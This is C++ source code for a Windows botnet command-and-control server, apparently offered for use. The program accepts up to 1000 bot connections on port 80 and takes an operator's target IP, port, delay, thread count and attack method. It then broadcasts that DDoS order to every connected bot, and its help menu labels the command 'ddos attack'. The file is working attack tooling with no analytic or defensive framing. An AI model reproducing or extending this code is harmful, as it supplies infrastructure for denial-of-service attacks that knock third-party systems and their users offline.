#include<iostream>
#include<cstring>
#include<thread>
#include<Windows.h>

int total_accept{0};
SOCKET listen_socket{0};
SOCKET client_socket[1000]{0};
SOCKADDR_IN client_info[1000]{0};

struct info
{
    char command[16];
    char ip[16];
    int port;
    int delay;
    int thread;
    char method[4];
} command;

void accept_thread()
{
    int size = sizeof(SOCKADDR_IN);
    for(int i = 0; i < 1000; i++) {
        client_socket[i] = accept(listen_socket, reinterpret_cast<sockaddr*>(&client_info[i]), &size);
        total_accept++;
    }
}

int main()
{
    WSADATA wsaData;
    WORD version = MAKEWORD(2, 2);
    WSAStartup(version, &wsaData);

    SOCKADDR_IN addr{0};
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = htonl(INADDR_ANY);
    addr.sin_port = htons(80);

    listen_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    bind(listen_socket, reinterpret_cast<sockaddr*>(&addr), sizeof(addr));
    listen(listen_socket, 5);

    std::thread(accept_thread).detach();

    while(true)
    {
        std::memset(&command, 0, sizeof(info));

        std::cout << " [Input] ";
        std::cin >> command.command;

        if(strcmp(command.command, "help") == 0)
        {
            std::cout << " HELP                        " << std::endl;
            std::cout << " | attack   ddos attack      " << std::endl;
        }

        else if(strcmp(command.command, "attack") == 0)
        {
            std::cout << " [TARGET IP] ";
            std::cin >> command.ip;
            std::cin.ignore();

            std::cout << " [TARGET PORT] ";
            std::cin >> command.port;
            std::cin.ignore();

            std::cout << " [ATTACK DELAY] ";
            std::cin >> command.delay;
            std::cin.ignore();

            std::cout << " [ATTACK THREAD] ";
            std::cin >> command.thread;
            
            std::cout << " [ATTACK METHOD] ";
            std::cin >> command.method;

            for(int i = 0; i < total_accept; i++) {
                send(client_socket[i], reinterpret_cast<char*>(&command), sizeof(info), 0);
            }
        }
    }

    return 0;
}